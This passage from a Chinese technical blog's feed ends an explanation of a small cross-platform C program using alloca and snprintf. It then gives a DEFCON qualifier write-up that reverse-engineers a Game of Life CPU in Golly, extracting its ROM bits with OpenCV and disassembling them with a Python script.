title="第三"></a>第三</h2><p>这个程序是一个跨平台的C代码示例，它在不同的编译器（GCC和MSVC）下进行一些内存分配和格式化输出的操作。以下是对该程序的详细分析：</p><ol><li><p><strong>平台差异性处理</strong>:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __GNUC__</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;alloca.h&gt;</span> <span class="comment">// GCC</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;malloc.h&gt;</span> <span class="comment">// MSVC</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>这段代码是用来处理不同编译器之间的兼容性问题。<code>__GNUC__</code> 是 GCC 编译器的预定义宏，表示代码在 GCC 下编译。如果是 GCC，程序会包含 <code>alloca.h</code> 头文件；否则，如果是在 MSVC (Microsoft Visual C++) 环境下编译，程序包含 <code>malloc.h</code> 头文件。</p></li><li><p><strong>动态内存分配</strong>:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *buf=(<span class="type">char</span>*)alloca (<span class="number">600</span>);</span><br></pre></td></tr></table></figure><p>这里使用了 <code>alloca</code> 函数来分配 600 字节的内存，这是一种动态分配内存的方式，不过它与 <code>malloc</code> 不同，<code>alloca</code> 是在栈上分配内存的，内存会在函数返回后自动释放，而 <code>malloc</code> 是在堆上分配，需手动调用 <code>free</code> 来释放内存。</p></li><li><p><strong>平台相关的字符串格式化函数</strong>:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __GNUC__</span></span><br><span class="line"><span class="built_in">snprintf</span> (buf, <span class="number">600</span>, <span class="string">&quot;hi! %d, %d, %d\n&quot;</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>); <span class="comment">// GCC</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">_snprintf (buf, <span class="number">600</span>, <span class="string">&quot;hi! %d, %d, %d\n&quot;</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>); <span class="comment">// MSVC</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>在这部分代码中，<code>snprintf</code> 是标准 C 库中的函数，它将格式化的字符串输出到缓冲区 <code>buf</code> 中。<code>snprintf</code> 和 <code>_snprintf</code> 在不同的编译器中有些许差异：</p><ul><li><code>snprintf</code> 是在 GNU C 和现代 C 标准中使用的标准函数。</li><li><code>_snprintf</code> 是 MSVC 中提供的等效函数，主要用于 Windows 环境。</li></ul><p>这段代码格式化输出一个字符串 <code>&quot;hi! 1, 2, 3\n&quot;</code> 到缓冲区 <code>buf</code> 中，最多写入 600 字节。</p></li><li><p><strong>输出到标准输出</strong>:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span> (buf);</span><br></pre></td></tr></table></figure><p>使用 <code>puts</code> 函数将缓冲区中的内容输出到标准输出设备（通常是控制台）。<code>puts</code> 函数会在打印完内容后自动添加换行符，因此缓冲区中的最后一个 <code>\n</code> 是冗余的。</p></li></ol><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>该程序的功能是跨平台地分配一段内存，然后将格式化字符串写入这段内存，最后打印到标准输出。它展示了如何通过条件编译来兼容不同的编译器，主要区别在于使用不同的内存分配头文件和格式化输出函数。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;问题1：EAX在调用printf函数前的操作&quot;&gt;&lt;a href=&quot;#问题1：EAX在调用printf函数前的操作&quot; class=&quot;headerlink&quot; title=&quot;问题1：EAX在调用printf函数前的操作&quot;&gt;&lt;/a&gt;问题1：EAX在调用printf函数前的</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>DEFCON quals | Rev  ncHEVjuw.txt</title>
    <link href="https://github.com/xyy9233/xyy9233.github.io.git/2024/09/15/DEFCONquals_Rev_ncHEVjuw/"/>
    <id>https://github.com/xyy9233/xyy9233.github.io.git/2024/09/15/DEFCONquals_Rev_ncHEVjuw/</id>
    <published>2024-09-14T16:00:00.000Z</published>
    <updated>2024-09-16T08:18:20.727Z</updated>
    
    <content type="html"><![CDATA[<h1 id="DEFCON-quals-Rev-ncHEVjuw-txt"><a href="#DEFCON-quals-Rev-ncHEVjuw-txt" class="headerlink" title="DEFCON quals | Rev  ncHEVjuw.txt"></a>DEFCON quals | Rev  ncHEVjuw.txt</h1><p>“电路是怎么构成CPU的？你可以这么想象，现在假想你已经控制了电路，可以任意的描述电路就可以把电路做出来，然后从这一步开始，你想要做一个CPU出来，忽略一些具体的细节，只关注最关键的部分，这                                                      个过程能不能描述出来——这样吧，不如我直接给你个题，你可以判断下这块够不够了。”</p><p>丁佬说用Golly打开，Golly存储格式为.rle，修改文件后缀，打开是一个CPU（小鳄鱼）</p><p>感觉思路大概是通过CPU的运行，通过程序的底层运行，还原程序，得到flag——</p><p>主要还是考CPU组成</p><hr><p>尝试运行，一闪一闪的——</p><p><img src="https://xyy9233.oss-cn-beijing.aliyuncs.com/hexoblog/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-09-13%20220336.png" alt="屏幕截图 2024-09-13 220336"></p><p>拉近再看，ROM，ROM EXPANDS THIS WAY&lt;—</p><p>ROM（Read Only Memory）只读存储器</p><p><img src="https://xyy9233.oss-cn-beijing.aliyuncs.com/hexoblog/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-09-13%20220503.png" alt="img"></p><p>ON——开关</p><p>ARG i MODE  操作数的寻址方式</p><p>ARG i VAL 实际操作数的值</p><p><img src="https://xyy9233.oss-cn-beijing.aliyuncs.com/hexoblog/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-09-13%20221052.png" alt="img"></p><p>OpCode</p><p><img src="https://xyy9233.oss-cn-beijing.aliyuncs.com/hexoblog/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-09-13%20222507.png" alt="img"></p><p>ALU 的输入包括数据和指令码。ALU 的输出是其执行运算的结果。</p><p><img src="https://xyy9233.oss-cn-beijing.aliyuncs.com/hexoblog/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-09-13%20223002.png" alt="img"></p><p>PC寄存器，存储当前指令的地址。当CPU执行一条指令后，它会自动增加PC的值，以指向下一条要执行的指令的地址。这个增加操作被称为 <strong>INC（increment，递增）</strong>。EIP</p><p><img src="https://xyy9233.oss-cn-beijing.aliyuncs.com/hexoblog/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-09-13%20223058.png" alt="img"></p><p>RAM（随机存取存储器）是用于存储数据和指令的存储器单元。</p><p>RAM 16 ADDR：表示RAM的地址宽度为16位，最多可以寻址65536个存储单元。</p><p>READ QUEUE读取队列——指令预取和 数据预取</p><p><img src="https://xyy9233.oss-cn-beijing.aliyuncs.com/hexoblog/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-09-13%20223407.png" alt="img"></p><p>找到一个类似的CPU——一模一样、</p><p><img src="https://xyy9233.oss-cn-beijing.aliyuncs.com/hexoblog/image-20240916153134760.png" alt="image-20240916153134760"></p><p><img src="https://xyy9233.oss-cn-beijing.aliyuncs.com/hexoblog/image-20240916153207060.png" alt="image-20240916153207060"></p><p>整个指令集包括11条RISC指令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">MNZ [test] [value] [dest] – Move if not zero; sets [dest] to [value] if [test] is not zero.</span><br><span class="line">MLZ [test] [value] [dest] – Move if less than zero; sets [dest] to [value] if [test] is less than zero.</span><br><span class="line">ADD [val1] [val2] [dest] – Add; adds [val1] to [val2] and stores the result in [dest].</span><br><span class="line">SUB [val1] [val2] [dest] – Subtract; subtracts [val2] from [val1] and stores the result in [dest].</span><br><span class="line">AND [val1] [val2] [dest] – Bitwise AND; bitwise ANDs together [val1] and [val2] and stores the result in [dest].</span><br><span class="line">OR [val1] [val2] [dest] – Bitwise OR; bitwise ORs together [val1] and [val2] and stores the result in [dest].</span><br><span class="line">XOR [val1] [val2] [dest] – Bitwise XOR; bitwise XORs together [val1] and [val2] and stores the result in [dest].</span><br><span class="line">ANT [val1] [val2] [dest] – Bitwise AND-NOT; bitwise ANDs together [val1] and (NOT [val2]) and stores the result in [dest].</span><br><span class="line">SL [val1] [val2] [dest] – Shift left; shifts [val1] left by [val2] bits and stores the result in [dest].</span><br><span class="line">SRL [val1] [val2] [dest] – Shift right (logical); shifts [val1] right by [val2] bits and stores the result in [dest]. Doesn&#x27;t preserve sign.</span><br><span class="line">SRA [val1] [val2] [dest] – Shift right (arithmetic); shifts [val1] right by [val2] bits and stores the result in [dest], while preserving sign.</span><br></pre></td></tr></table></figure><p>指令支持4种寻址方式，在汇编语言中用特定前缀区分：</p><ul><li>立即寻址：无前缀</li><li>直接寻址：前缀A</li><li>间接寻址：前缀B</li><li>双重间接寻址：前缀C</li></ul><hr><p>ok懂了，那就先把ROM的信息拿出来——</p><p><img src="https://xyy9233.oss-cn-beijing.aliyuncs.com/hexoblog/1111.png" alt="1111"></p><p>这是一个1</p><p>对应这个大图——</p><p><img src="https://xyy9233.oss-cn-beijing.aliyuncs.com/hexoblog/png1.png" alt="png1"></p><p>标注0和1——</p><p><img src="https://xyy9233.oss-cn-beijing.aliyuncs.com/hexoblog/annotated_png1.png" alt="annotated_png1"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">image = cv2.imread(<span class="string">&#x27;png1.png&#x27;</span>)</span><br><span class="line">black_template = cv2.imread(<span class="string">&#x27;0000.png&#x27;</span>, <span class="number">0</span>) </span><br><span class="line">white_template = cv2.imread(<span class="string">&#x27;1111.png&#x27;</span>, <span class="number">0</span>) </span><br><span class="line"></span><br><span class="line">h_template, w_template = black_template.shape</span><br><span class="line">image_gray = cv2.cvtColor(image, cv2.COLOR_BGR2GRAY)</span><br><span class="line">img_height, img_width = image_gray.shape</span><br><span class="line"></span><br><span class="line">matrix = np.full((img_height // h_template, img_width // w_template), <span class="string">&#x27;0&#x27;</span>, dtype=<span class="built_in">str</span>)</span><br><span class="line">res_black = cv2.matchTemplate(image_gray, black_template, cv2.TM_CCOEFF_NORMED)</span><br><span class="line">threshold = <span class="number">0.8</span></span><br><span class="line">loc_black = np.where(res_black &gt;= threshold)</span><br><span class="line"></span><br><span class="line">res_white = cv2.matchTemplate(image_gray, white_template, cv2.TM_CCOEFF_NORMED)</span><br><span class="line">loc_white = np.where(res_white &gt;= threshold)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> pt <span class="keyword">in</span> <span class="built_in">zip</span>(*loc_black[::-<span class="number">1</span>]):</span><br><span class="line">    x, y = pt</span><br><span class="line">    matrix[y // h_template, x // w_template] = <span class="string">&#x27;0&#x27;</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> pt <span class="keyword">in</span> <span class="built_in">zip</span>(*loc_white[::-<span class="number">1</span>]):</span><br><span class="line">    x, y = pt</span><br><span class="line">    matrix[y // h_template, x // w_template] = <span class="string">&#x27;1&#x27;</span>  </span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;matrix_output.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> row <span class="keyword">in</span> matrix:</span><br><span class="line">        f.write(<span class="string">&#x27;&#x27;</span>.join(row) + <span class="string">&#x27;\n&#x27;</span>)</span><br></pre></td></tr></table></figure><p>根据延申方向和ROM结构，后四位是opcode，前18位为addr3，19-18*2为addr2，18*2+1到18*3为addr1，18*3+4 &#x3D; 57行，</p><p>所以从右往左一列一列、从下往上、4.18.18.18读取</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line">000000000000000000000000000000000000000000000000000000000</span><br><span class="line">000000000001010110000000000001011000011111111111111110001</span><br><span class="line">000000000000000100000000000000000000000000000000000000110</span><br><span class="line">000000000000000100001100101011100110011111111111111110001</span><br><span class="line">000000000000000110000111000110110100011111111111111110001</span><br><span class="line">000000000000001000001010111101011010011111111111111110001</span><br><span class="line">000000000000001010001100011010000110011111111111111110001</span><br><span class="line">000000000000001100000001110100111110011111111111111110001</span><br><span class="line">000000000000001110000110100010011110011111111111111110001</span><br><span class="line">000000000000010000000101111000110110011111111111111110001</span><br><span class="line">000000000000010010000001001111110100011111111111111110001</span><br><span class="line">000000000000010100000111101110011110011111111111111110001</span><br><span class="line">000000000000010110000010111001000010011111111111111110001</span><br><span class="line">000000000000011000001000110010110010011111111111111110001</span><br><span class="line">000000000000011010000111001111001110011111111111111110001</span><br><span class="line">000000000000011100000010010100101010011111111111111110001</span><br><span class="line">000000000000011110000011110010010100011111111111111110001</span><br><span class="line">000000000000100000001010111110100000011111111111111110001</span><br><span class="line">000000000000100010000100000101100110011111111111111110001</span><br><span class="line">000000000000100100000110000100000100011111111111111110001</span><br><span class="line">000000000000100110001011000110100100011111111111111110001</span><br><span class="line">000000000000101000001000000011100110011111111111111110001</span><br><span class="line">000000000000101010000011011110111000011111111111111110001</span><br><span class="line">000000000000101100001011001000010010011111111111111110001</span><br><span class="line">000000000000101110001010111001000110011111111111111110001</span><br><span class="line">000000000000110000000110000110001010011111111111111110001</span><br><span class="line">000000000000110010000011111000000000011111111111111110001</span><br><span class="line">000000000000110100001101000000001100011111111111111110001</span><br><span class="line">000000000000110110000111100011110110011111111111111110001</span><br><span class="line">000000000000111000000011001010001110011111111111111110001</span><br><span class="line">000000000000111010000000111000011100011111111111111110001</span><br><span class="line">000000000000111100001011000101100010011111111111111110001</span><br><span class="line">000000000000111110001100001101110110011111111111111110001</span><br><span class="line">000000000001000000001000000001110100011111111111111110001</span><br><span class="line">000000000001000010000010100000110010011111111111111110001</span><br><span class="line">000000000001000100000111100111010010011111111111111110001</span><br><span class="line">000000000001000110001011101001110110011111111111111110001</span><br><span class="line">000000000001001000001011100101110100011111111111111110001</span><br><span class="line">000000000001001010000110111000001100011111111111111110001</span><br><span class="line">000000000001001100001011010010100110011111111111111110001</span><br><span class="line">000000000001001110000000000000000000011111111111111110001</span><br><span class="line">000000000001001110010010101110101010100000000000000010110</span><br><span class="line">000000000000000100100000000000000100100000000001001110011</span><br><span class="line">000000000001001110011001001001111100100000000000000010110</span><br><span class="line">000000000000000110100000000000000110100000000001001110011</span><br><span class="line">000000000001001110010100111111010110100000000000000010110</span><br><span class="line">000000000000001000100000000000001000100000000001001110011</span><br><span class="line">000000000001001110010010011101010010100000000000000010110</span><br><span class="line">000000000000001010100000000000001010100000000001001110011</span><br><span class="line">000000000001001110011111111000111110100000000000000010110</span><br><span class="line">000000000000001100100000000000001100100000000001001110011</span><br><span class="line">000000000001001110011000100101010100100000000000000010110</span><br><span class="line">000000000000001110100000000000001110100000000001001110011</span><br><span class="line">000000000001001110011011111011011010100000000000000010110</span><br><span class="line">000000000000010000100000000000010000100000000001001110011</span><br><span class="line">000000000001001110011111010011110010100000000000000010110</span><br><span class="line">000000000000010010100000000000010010100000000001001110011</span><br><span class="line">000000000001001110011001110001000000100000000000000010110</span><br><span class="line">000000000000010100100000000000010100100000000001001110011</span><br><span class="line">000000000001001110011100111100111010100000000000000010110</span><br><span class="line">000000000000010110100000000000010110100000000001001110011</span><br><span class="line">000000000001001110010110110110110110100000000000000010110</span><br><span class="line">000000000000011000100000000000011000100000000001001110011</span><br><span class="line">000000000001001110011001010010100010100000000000000010110</span><br><span class="line">000000000000011010100000000000011010100000000001001110011</span><br><span class="line">000000000001001110011100011000101100100000000000000010110</span><br><span class="line">000000000000011100100000000000011100100000000001001110011</span><br><span class="line">000000000001001110011101110101001000100000000000000010110</span><br><span class="line">000000000000011110100000000000011110100000000001001110011</span><br><span class="line">000000000001001110010101000001000010100000000000000010110</span><br><span class="line">000000000000100000100000000000100000100000000001001110011</span><br><span class="line">000000000001001110011010001000011110100000000000000010110</span><br><span class="line">000000000000100010100000000000100010100000000001001110011</span><br><span class="line">000000000001001110011000000111101100100000000000000010110</span><br><span class="line">000000000000100100100000000000100100100000000001001110011</span><br><span class="line">000000000001001110010101001001001100100000000000000010110</span><br><span class="line">000000000000100110100000000000100110100000000001001110011</span><br><span class="line">000000000001001110010110000110001010100000000000000010110</span><br><span class="line">000000000000101000100000000000101000100000000001001110011</span><br><span class="line">000000000001001110011101100010000100100000000000000010110</span><br><span class="line">000000000000101010100000000000101010100000000001001110011</span><br><span class="line">000000000001001110010101001011011110100000000000000010110</span><br><span class="line">000000000000101100100000000000101100100000000001001110011</span><br><span class="line">000000000001001110010100111100011110100000000000000010110</span><br><span class="line">000000000000101110100000000000101110100000000001001110011</span><br><span class="line">000000000001001110011000001001000000100000000000000010110</span><br><span class="line">000000000000110000100000000000110000100000000001001110011</span><br><span class="line">000000000001001110011101111011100100100000000000000010110</span><br><span class="line">000000000000110010100000000000110010100000000001001110011</span><br><span class="line">000000000001001110010011000011100100100000000000000010110</span><br><span class="line">000000000000110100100000000000110100100000000001001110011</span><br><span class="line">000000000001001110011001100111111010100000000000000010110</span><br><span class="line">000000000000110110100000000000110110100000000001001110011</span><br><span class="line">000000000001001110011101001101000100100000000000000010110</span><br><span class="line">000000000000111000100000000000111000100000000001001110011</span><br><span class="line">000000000001001110011110111011110100100000000000000010110</span><br><span class="line">000000000000111010100000000000111010100000000001001110011</span><br><span class="line">000000000001001110010101001001111010100000000000000010110</span><br><span class="line">000000000000111100100000000000111100100000000001001110011</span><br><span class="line">000000000001001110010010010001111010100000000000000010110</span><br><span class="line">000000000000111110100000000000111110100000000001001110011</span><br><span class="line">000000000001001110010110000101110000100000000000000010110</span><br><span class="line">000000000001000000100000000001000000100000000001001110011</span><br><span class="line">000000000001001110011100100100111000100000000000000010110</span><br><span class="line">000000000001000010100000000001000010100000000001001110011</span><br><span class="line">000000000001001110011001101010111110100000000000000010110</span><br><span class="line">000000000001000100100000000001000100100000000001001110011</span><br><span class="line">000000000001001110010101101101111010100000000000000010110</span><br><span class="line">000000000001000110100000000001000110100000000001001110011</span><br><span class="line">000000000001001110010101101001001100100000000000000010110</span><br><span class="line">000000000001001000100000000001001000100000000001001110011</span><br><span class="line">000000000001001110011000111011000110100000000000000010110</span><br><span class="line">000000000001001010100000000001001010100000000001001110011</span><br><span class="line">000000000001001110010101010110001110100000000000000010110</span><br><span class="line">000000000001001100100000000001001100100000000001001110011</span><br><span class="line">000000000000000000011111111111111100011111111111111110001</span><br><span class="line">000000000000000000000000000000000000000000000000000000001</span><br><span class="line">000000000000000000000000000000000000000000000000000000000</span><br></pre></td></tr></table></figure><p>根据</p><p><img src="https://xyy9233.oss-cn-beijing.aliyuncs.com/hexoblog/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-09-15%20005952.png" alt="屏幕截图 2024-09-15 005952"></p><p>和上面的规则，hex2asm.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> bitstring <span class="keyword">import</span> BitArray</span><br><span class="line"></span><br><span class="line">opcodes = &#123;<span class="string">&#x27;0000&#x27;</span>: <span class="string">&#x27;MNZ&#x27;</span>,</span><br><span class="line">           <span class="string">&#x27;0001&#x27;</span>: <span class="string">&#x27;MLZ&#x27;</span>,</span><br><span class="line">           <span class="string">&#x27;0010&#x27;</span>: <span class="string">&#x27;ADD&#x27;</span>,</span><br><span class="line">           <span class="string">&#x27;0011&#x27;</span>: <span class="string">&#x27;SUB&#x27;</span>,</span><br><span class="line">           <span class="string">&#x27;0100&#x27;</span>: <span class="string">&#x27;AND&#x27;</span>,</span><br><span class="line">           <span class="string">&#x27;0101&#x27;</span>: <span class="string">&#x27;OR&#x27;</span>,</span><br><span class="line">           <span class="string">&#x27;0110&#x27;</span>: <span class="string">&#x27;XOR&#x27;</span>,</span><br><span class="line">           <span class="string">&#x27;0111&#x27;</span>: <span class="string">&#x27;ANT&#x27;</span>,</span><br><span class="line">           <span class="string">&#x27;1000&#x27;</span>: <span class="string">&#x27;SL&#x27;</span>,</span><br><span class="line">           <span class="string">&#x27;1001&#x27;</span>: <span class="string">&#x27;SRL&#x27;</span>,</span><br><span class="line">           <span class="string">&#x27;1010&#x27;</span>: <span class="string">&#x27;SRA&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">modes = &#123;<span class="string">&#x27;00&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">         <span class="string">&#x27;01&#x27;</span>: <span class="string">&#x27;A&#x27;</span>,</span><br><span class="line">         <span class="string">&#x27;10&#x27;</span>: <span class="string">&#x27;B&#x27;</span>,</span><br><span class="line">         <span class="string">&#x27;11&#x27;</span>: <span class="string">&#x27;C&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse</span>(<span class="params">code</span>):</span><br><span class="line">    out = <span class="string">&quot;&quot;</span></span><br><span class="line">    count = <span class="number">0</span> </span><br><span class="line">    <span class="keyword">for</span> l <span class="keyword">in</span> code[::<span class="number">1</span>]:</span><br><span class="line">        opcode = opcodes[l[-<span class="number">4</span>:]]</span><br><span class="line">        arg1 = l[<span class="number">18</span>*<span class="number">2</span>-<span class="number">1</span>:-<span class="number">4</span>]</span><br><span class="line">        arg2 = l[<span class="number">17</span>:<span class="number">18</span>*<span class="number">2</span>-<span class="number">1</span>]</span><br><span class="line">        arg3 = l[:<span class="number">17</span>]</span><br><span class="line">        mode1 = modes[arg1[:<span class="number">2</span>]]</span><br><span class="line">        arg1 = <span class="built_in">str</span>(BitArray(<span class="built_in">bin</span>=arg1[<span class="number">2</span>:]).<span class="built_in">int</span>)</span><br><span class="line">        mode2 = modes[arg2[:<span class="number">2</span>]]</span><br><span class="line">        arg2 = <span class="built_in">str</span>(BitArray(<span class="built_in">bin</span>=arg2[<span class="number">2</span>:]).uint) //这里转无符号数</span><br><span class="line">        mode3 = modes[arg3[:<span class="number">2</span>]]</span><br><span class="line">        arg3 = <span class="built_in">str</span>(BitArray(<span class="built_in">bin</span>=arg3[<span class="number">2</span>:]).uint)</span><br><span class="line">        out += <span class="built_in">str</span>(count) + <span class="string">&#x27;. &#x27;</span> + opcode + <span class="string">&#x27; &#x27;</span> + mode1 + arg1 + <span class="string">&#x27; &#x27;</span> + mode2 + arg2 + <span class="string">&#x27; &#x27;</span> + mode3 + arg3 +<span class="string">&#x27;\n&#x27;</span></span><br><span class="line">        count+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> out</span><br><span class="line"></span><br><span class="line">code = []</span><br><span class="line">asm = parse(code)</span><br><span class="line"><span class="built_in">print</span>(asm)</span><br></pre></td></tr></table></figure><p>这里，value值不考虑负数，所以以无符号数转化</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span 